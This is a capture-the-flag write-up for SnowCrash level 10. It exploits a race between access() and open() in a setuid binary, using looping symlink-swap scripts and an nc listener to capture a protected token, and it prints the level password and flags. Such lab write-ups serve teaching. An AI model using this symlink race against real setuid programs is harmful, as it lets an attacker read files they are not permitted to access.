# Level 10 : found flag10

```bash
ssh level10@192.168.1.37 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.1.37
level10@192.168.1.37's password: s5cAJpM8ev6XHw998pRWG728z
level10@SnowCrash:~$
```

```bash
level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

## 1. Observation

```bash
level10@SnowCrash:~$ ltrace ./level10 /tmp/blob 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff784, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/blob", 4)                                      = 0
printf("Connecting to %s:6969 .. ", "127.0.0.1")            = 32
fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                                          = 0
socket(2, 1, 0)                                             = 3
inet_addr("127.0.0.1")                                      = 0x0100007f
htons(6969, 1, 0, 0, 0)                                     = 14619
connect(3, 0xbffff6cc, 16, 0, 0)                            = -1
printf("Unable to connect to host %s\n", "127.0.0.1"Unable to connect to host 127.0.0.1
)       = 36
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

```bash
nc -klv 6969 # to read on port 6969.
```

```
$ man nm
NC(1)                     BSD General Commands Manual                    NC(1)

NAME
     nc -- arbitrary TCP and UDP connections and listens

SYNOPSIS
     nc [-46AcDCdhklnrtUuvz] [-b boundif] [-i interval] [-p source_port]
        [-s source_ip_address] [-w timeout] [-X proxy_protocol] [-x
        proxy_address[:port]] [--apple-delegate-pid pid]
        [--apple-delegate-uuid uuid] [--apple-ext-bk-idle]
        [--apple-nowakefromsleep] [--apple-ecn mode] [hostname] [port[s]]

DESCRIPTION
     The nc (or netcat) utility is used for just about anything under the sun
     involving TCP or UDP.  It can open TCP connections, send UDP packets,
     listen on arbitrary TCP and UDP ports, do port scanning, and deal with
     both IPv4 and IPv6.  Unlike telnet(1), nc scripts nicely, and separates
     error messages onto standard error instead of sending them to standard
     output, as telnet(1) does with some.

     -k      Forces nc to stay listening for another connection after its cur-
             rent connection is completed.  It is an error to use this option
             without the -l option.

     -l      Used to specify that nc should listen for an incoming connection
             rather than initiate a connection to a remote host.  It is an
             error to use this option in conjunction with the -p, -s, or -z
             options.  Additionally, any timeouts specified with the -w option
             are ignored.

     -v      Have nc give more verbose output.
```

```bash
level10@SnowCrash:~$ ltrace ./level10 /tmp/blob 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff784, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/blob", 4)                                      = 0
printf("Connecting to %s:6969 .. ", "127.0.0.1")            = 32
fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                                          = 0
socket(2, 1, 0)                                             = 3
inet_addr("127.0.0.1")                                      = 0x0100007f
htons(6969, 1, 0, 0, 0)                                     = 14619
connect(3, 0xbffff6cc, 16, 0, 0)                            = 0
write(3, ".*( )*.\n", 8)                                    = 8
printf("Connected!\nSending file .. "Connected!
)                      = 27
fflush(0xb7fd1a20Sending file .. )                                          = 0
open("/tmp/blob", 0, 010)                                   = 4
read(4, "", 4096)                                           = 0
write(3, "", 0)                                             = 0
puts("wrote file!"wrote file!
)                                         = 12
+++ exited (status 12) +++
```

```
Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided. (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
```
[source](https://linux.die.net/man/2/access)

## 2. Solution

```bash
level10@SnowCrash:~$ mkdir -p /tmp/eb10
level10@SnowCrash:~$ touch /tmp/eb10/10ok
level10@SnowCrash:~$ ln -s /tmp/eb10/10ok /tmp/eb10/10access
level10@SnowCrash:~$ echo '
#!/bin/bash
while [ 1 ]; do
    ln -sfn /home/user/level10/token /tmp/eb10/10access
    ln -sfn /tmp/10ok /tmp/eb10/10access
done' > /tmp/eb10/change_link
level10@SnowCrash:~$ echo '
#!/bin/bash
while [ 1 ]; do
    ./level10 /tmp/eb10/10access 127.0.0.1
done' > /tmp/eb10/access_link
level10@SnowCrash:~$ chmod +x /tmp/eb10/access_link
level10@SnowCrash:~$ chmod +x /tmp/eb10/change_link
level10@SnowCrash:~$ ls -la /tmp/eb10
total 12
drwxrwxr-x 2 level10 level10 140 Jan 31 18:48 .
d-wx-wx-wx 7 root    root    400 Jan 31 18:48 ..
lrwxrwxrwx 1 level10 level10  14 Jan 31 18:48 10access -> /tmp/eb10/10ok
-rw-rw-r-- 1 level10 level10   0 Jan 31 18:48 10ok
-rwxrwxr-x 1 level10 level10  72 Jan 31 18:48 access_link
-rwxrwxr-x 1 level10 level10 126 Jan 31 18:48 change_link
-rw-rw-r-- 1 level10 level10 124 Jan 31 18:39 relink
```


```bash
level10@SnowCrash:~$ /tmp/eb10/change_link
```

```bash
level10@SnowCrash:~$ /tmp/eb10/access_link
[..]
Sending file .. wrote file!
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
You don't have access to /tmp/eb10/10access
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
You don't have access to /tmp/eb10/10access
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
You don't have access to /tmp/eb10/10access
You don't have access to /tmp/eb10/10access
[..]
```

```bash
nc -klv 6969
[..]
Connection from 127.0.0.1 port 6969 [tcp/*] accepted                                                                                                              │·······················································
.*( )*.                                                                                                                                                           │·······················································
woupa2yuojeeaaed06riuj63c
```

```bash
level10@SnowCrash:~$ su flag10
Password:
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

----
Documentation:
* https://linux.die.net/man/2/access
* https://linux.die.net/man/1/nc
